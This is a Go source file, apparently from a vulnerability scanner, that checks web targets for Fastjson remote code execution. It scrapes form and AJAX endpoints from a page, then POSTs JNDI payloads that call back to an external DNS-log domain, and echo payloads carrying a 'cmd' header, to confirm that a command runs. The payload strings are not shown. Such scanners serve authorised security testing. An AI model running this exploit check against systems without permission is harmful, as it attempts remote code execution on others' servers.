package fastjson

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"net/url"
	"regexp"
	"strings"
)

func Check(u string, finalURL string) string {
	domainx := getinputurl(finalURL)
	for _, jsonurl := range domainx {
		header := make(map[string]string)
		header["Content-Type"] = "application/json"
		if pkg.CeyeApi != "" && pkg.CeyeDomain != "" {
			randomstr := pkg.RandomStr() + "fastjson"
			for _, payload := range fastjsonJndiPayloads {
				_, _ = pkg.HttpRequset(jsonurl, "POST", strings.Replace(payload, "dnslog-url", randomstr+"."+pkg.CeyeDomain, -1), false, header)
			}
			if pkg.Dnslogchek(randomstr) {
				pkg.GoPocLog(fmt.Sprintf("Found vuln FastJson JNDI RCE |%s\n", u))
				return "JNDI RCE"
			}
		} else {
			header["cmd"] = "echo jsonvuln"
			for _, payload := range fastjsonEchoPayloads {
				if req, err := pkg.HttpRequset(jsonurl, "POST", payload, false, header); err == nil {
					if strings.Contains(req.Body, "jsonvuln") {
						pkg.GoPocLog(fmt.Sprintf("Found vuln FastJson ECHO RCE |%s\n", u))
						return "ECHO RCE"
					}
				}
			}
		}
	}
	return ""
}

func getinputurl(domainurl string) (domainurlx []string) {
	req, err := pkg.HttpRequset(domainurl, "GET", "", true, nil)
	if err != nil {
		return nil
	}
	var loginurl []string
	hrefreg := regexp.MustCompile(`location.href='(.*?)'`)
	hreflist := hrefreg.FindStringSubmatch(req.Body)
	if hreflist != nil {
		req, err = pkg.HttpRequset(domainurl+"/"+hreflist[len(hreflist)-1:][0], "GET", "", true, nil)
		if err != nil {
			return nil
		}
	}
	domainreg := regexp.MustCompile(`<form.*?action="(.*?)"`)
	domainlist := domainreg.FindStringSubmatch(req.Body)
	if domainlist != nil {
		domainx := domainlist[len(domainlist)-1:][0]
		if strings.Contains(domainx, "http") {
			loginurl = append(loginurl, domainx)
		} else if domainx == "" {
			loginurl = loginurl
		} else if domainx[0:1] == "/" {
			u, _ := url.Parse(domainurl)
			loginurl = append(loginurl, u.Scheme+"://"+u.Host+domainx)
		} else {
			loginurl = append(loginurl, domainurl+"/"+domainx)
		}
	}
	domainreg2 := regexp.MustCompile(`ajax[\s\S]*?url.*?['|"](.*?)['|"]`)
	domainlist2 := domainreg2.FindAllStringSubmatch(req.Body, -1)
	if domainlist2 != nil {
		for _, a := range domainlist2 {
			domainx := a[1]
			if strings.Contains(domainx, "http") {
				loginurl = append(loginurl, domainx)
			} else if domainx == "" {
				loginurl = append(loginurl, domainurl)
			} else if domainx[0:1] == "/" {
				u, _ := url.Parse(domainurl)
				loginurl = append(loginurl, u.Scheme+"://"+u.Host+domainx)
			} else {
				loginurl = append(loginurl, domainurl+"/"+domainx)
			}
		}
	}
	return loginurl
}
